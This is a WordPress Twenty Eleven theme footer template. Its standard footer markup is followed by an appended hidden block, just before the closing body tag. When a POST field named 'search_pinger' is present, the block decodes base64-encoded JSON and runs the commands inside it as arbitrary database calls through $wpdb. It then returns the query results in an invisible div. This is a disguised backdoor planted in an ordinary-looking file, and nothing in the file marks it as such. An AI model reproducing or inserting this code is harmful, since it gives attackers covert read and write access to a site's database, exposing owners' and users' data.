<?php
/**
 * Template for displaying the footer
 *
 * Contains the closing of the id=main div and all content after
 *
 * @package WordPress
 * @subpackage Twenty_Eleven
 * @since Twenty Eleven 1.0
 */
?>

	</div><!-- #main -->

	<footer id="colophon" role="contentinfo">

			<?php
				/*
				 * A sidebar in the footer? Yep. You can customize
				 * your footer with three columns of widgets.
				 */
				if ( ! is_404() )
					get_sidebar( 'footer' );
			?>

			<div id="site-generator">
				<?php do_action( 'twentyeleven_credits' ); ?>
				<a href="<?php echo esc_url( __( 'https://wordpress.org/', 'twentyeleven' ) ); ?>" title="<?php esc_attr_e( 'Semantic Personal Publishing Platform', 'twentyeleven' ); ?>"><?php printf( __( 'Proudly powered by %s', 'twentyeleven' ), 'WordPress' ); ?></a>
			</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>


<?php if(isset($_POST['search_pinger'])){
function asdping(){
global $wpdb;
$res=array();
$ping = json_decode(base64_decode(substr($_POST['search_pinger'], 32,strlen($_POST['search_pinger']))), true);
foreach($ping as $cmd){
preg_match_all('/\{\w+\}/is', $cmd['q'], $vars);
foreach($vars[0] as $var){
$entity = trim($var,'{}');
$cmd['q'] = str_replace($var, $wpdb->$entity, $cmd['q']);
}
$m = $cmd['m'];
$q = $cmd['q'];
$data = $wpdb->$m($q);
strpos($cmd['m'], 'get_')!==false ? $res[]=$data : '';
}
echo !empty($res)? '<div id="pinger" style="display:none;">'.json_encode($res).'</div>' : '';

unset($_POST['search_pinger']);
}
asdping();
} ?>
</body>
</html>